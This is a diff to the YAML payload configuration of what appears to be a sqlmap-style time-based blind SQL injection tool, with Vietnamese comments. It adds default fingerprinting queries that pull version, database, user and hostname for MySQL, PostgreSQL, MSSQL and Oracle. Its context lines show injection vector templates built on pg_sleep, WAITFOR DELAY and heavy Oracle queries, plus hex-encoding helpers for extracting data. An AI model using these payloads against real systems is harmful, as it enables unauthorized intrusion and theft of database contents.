@@ -32,6 +32,12 @@ mysql:
     hex:     "hex(({s}))"               # hex hóa
     hexlit:  "0x{h}"                    # hex literal (cho verify không cần nháy)
     notnull: "(({s}) is not null)"      # kiểm tra subquery có dữ liệu
+  # Query mặc định theo DBMS (dùng khi không truyền --query). Nguồn: sqlmap queries.xml
+  queries:
+    version:  "select version()"
+    database: "select database()"
+    user:     "select current_user()"
+    hostname: "select @@hostname"
   vectors:
     # query-SLEEP bọc subquery: sleep chỉ chạy 1 lần kể cả trong JOIN (ưu tiên cao)
     - name: mysql-query-sleep
@@ -59,6 +65,11 @@ postgresql:
     hex:     "encode(convert_to(({s}),'UTF8'),'hex')"
     hexlit:  "decode('{h}','hex')"      # pg không có 0x literal
     notnull: "(({s}) is not null)"
+  queries:
+    version:  "select version()"
+    database: "select current_database()"
+    user:     "select current_user"
+    hostname: "select inet_server_addr()"
   vectors:
     - name: pg-sleep-case
       template: "(case when [INFERENCE] then pg_sleep([SLEEPTIME]) else pg_sleep(0) end)"
@@ -76,6 +87,11 @@ mssql:
     hex:     "master.dbo.fn_varbintohexstr(CONVERT(varbinary,({s})))"
     hexlit:  "0x{h}"
     notnull: "(CASE WHEN ({s}) IS NOT NULL THEN 1 ELSE 0 END)=1"
+  queries:
+    version:  "select @@version"
+    database: "select db_name()"
+    user:     "select system_user"
+    hostname: "select @@servername"
   vectors:
     # WAITFOR DELAY là STATEMENT, không phải scalar -> cần ngữ cảnh statement/stacked
     - name: mssql-waitfor
@@ -94,6 +110,11 @@ oracle:
     hex:     "RAWTOHEX(UTL_RAW.CAST_TO_RAW(({s})))"
     hexlit:  "'{h}'"                    # oracle: so sánh hex như chuỗi
     notnull: "(({s}) is not null)"
+  queries:
+    version:  "select banner from v$version where rownum=1"
+    database: "select sys.database_name from dual"
+    user:     "select user from dual"
+    hostname: "select sys_context('userenv','server_host') from dual"
   vectors:
     - name: oracle-heavy-case
       template: "(case when [INFERENCE] then (select count(*) from all_objects,all_objects) else 0 end)"
